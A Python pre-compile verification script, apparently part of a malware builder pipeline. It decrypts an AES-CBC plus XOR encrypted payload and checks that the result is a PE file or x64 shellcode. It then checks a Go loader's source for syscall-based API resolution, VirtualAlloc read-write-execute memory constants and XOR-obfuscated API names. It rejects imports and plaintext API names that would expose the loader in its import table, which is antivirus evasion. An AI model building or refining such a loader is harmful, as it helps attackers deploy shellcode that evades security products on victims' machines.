#!/usr/bin/env python3
"""编译前验证：检查加密产物和 Go 源码的正确性
用法: <python命令> verify_pre.py <output_dir> <go_source.go>
"""
import os, sys, re

if len(sys.argv) < 3:
    print(f"用法: {sys.argv[0]} <output_dir> <go_source.go>")
    sys.exit(1)

output_dir = sys.argv[1]
go_file = sys.argv[2]
eout_file = os.path.join(output_dir, '.eout.txt')

errors = []

# --- 1. 解密流程验证 ---
with open(eout_file, 'rb') as f:
    raw = f.read()
lines = raw.decode('utf-8', errors='replace').split('\n')

enc_hex = None
key_line = None
for line in lines:
    line = line.strip()
    if line.startswith('0x') and ',' in line and len(line) > 100:
        enc_hex = line
    elif '|' in line and len(line) == 65:
        key_line = line

if not enc_hex or not key_line:
    print(f'FATAL: Cannot parse encrypted data or key from {eout_file}')
    sys.exit(1)

enc_bytes = bytes(int(x, 16) for x in enc_hex.split(','))
aes_hex, xor_hex = key_line.split('|')
aes_key = aes_hex.encode()
xor_key = bytes.fromhex(xor_hex)

from Crypto.Cipher import AES
cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_key[:16])
dec = cipher.decrypt(enc_bytes)
pad = dec[-1]
dec = dec[:-pad]
plainText = bytes(b ^ xor_key[i % 16] for i, b in enumerate(dec))

print(f'Decrypt: {len(plainText)} bytes', end='')
if len(plainText) < 100 or len(plainText) > 100000:
    print(' FAIL (unreasonable size)')
    sys.exit(1)
print(' OK')

# --- 2. 检查解密后数据是否有效 ---
if plainText[:2] == b'MZ':
    print('  Content: PE file (MZ header)')
elif plainText[0] in (0xE9, 0xEB, 0xFC, 0xE8, 0x48, 0x4D, 0x55, 0x56):
    print(f'  Content: looks like x64 shellcode (starts with 0x{plainText[0]:02X})')
else:
    print(f'  WARN: unexpected first byte 0x{plainText[0]:02X}')

# --- 3. Go 源码模式检查 ---
with open(go_file, encoding='utf-8') as f:
    src = f.read()

checks = {
    'uses syscall package': '"syscall"',
    'AES key as []byte': ['[]byte(', '[:sep]'],
    'XOR key hex decode': 'hex.DecodeString(',
    'VirtualAlloc constants': ['0x3000', '0x40'],
    'syscall.LoadLibrary used': 'syscall.LoadLibrary(',
    'syscall.GetProcAddress used': 'syscall.GetProcAddress(',
    'syscall.SyscallN used': 'syscall.SyscallN(',
    'XOR decode function exists': 'func ',
    'unsafe.Pointer for memory copy': 'unsafe.Pointer(',
}

for desc, pat in checks.items():
    if isinstance(pat, list):
        ok = all(p in src for p in pat)
    else:
        ok = pat in src
    print(f'  {"OK" if ok else "FAIL"}: {desc}')
    if not ok:
        errors.append(desc)

# --- 4. 禁止模式检查 ---
danger = {
    'golang.org/x/sys/windows (IAT leak)': 'golang.org/x/sys/windows',
    'LazyDLL (IAT leak)': 'windows.NewLazyDLL',
    'NtProtectVirtualMemory (crash risk)': 'NtProtectVirtualMemory',
    'plaintext API name VirtualAlloc': '"VirtualAlloc"',
    'plaintext API name CreateThread': '"CreateThread"',
}
for desc, pat in danger.items():
    if pat in src:
        print(f'  FAIL: {desc} found in source!')
        errors.append(desc)

# --- 5. SyscallN 参数数量检查 ---
syscall_calls = re.findall(r'syscall\.SyscallN\(([^)]+)\)', src)
for call in syscall_calls:
    args = [a.strip() for a in call.split(',')]
    n_args = len(args) - 1
    if n_args > 6:
        print(f'  WARN: SyscallN with {n_args} args (max expected 6)')

# --- 6. XOR 编码正确性验证 ---
# 匹配所有 XOR 解码调用: funcName([]byte{...}, 0xXX)
xor_calls = re.findall(r'(\w+)\(\[\]byte\{([^}]+)\},\s*0x([0-9A-Fa-f]+)\)', src)
xor_errors = 0
for func_name, hex_bytes, key_hex in xor_calls:
    key = int(key_hex, 16)
    byte_vals = [int(x.strip(), 16) for x in hex_bytes.split(',') if x.strip()]
    decoded = ''.join(chr(b ^ key) for b in byte_vals)
    if not all(32 <= ord(c) <= 126 for c in decoded):
        print(f'  FAIL: XOR decode produces non-printable: key=0x{key:02X} result={decoded!r}')
        xor_errors += 1
    elif not (decoded.endswith('.dll') or decoded[0].isupper() or decoded.startswith('ntdll')):
        print(f'  WARN: XOR decode unusual: key=0x{key:02X} result={decoded!r}')
if xor_errors > 0:
    errors.append(f'XOR encoding errors: {xor_errors}')
    print(f'  FAIL: {xor_errors} XOR encoding errors detected')
else:
    print(f'  OK: All {len(xor_calls)} XOR encodings decode to valid strings')

if errors:
    print(f'\nVERIFICATION FAILED: {len(errors)} errors')
    sys.exit(1)
else:
    print('\nALL CHECKS PASSED')
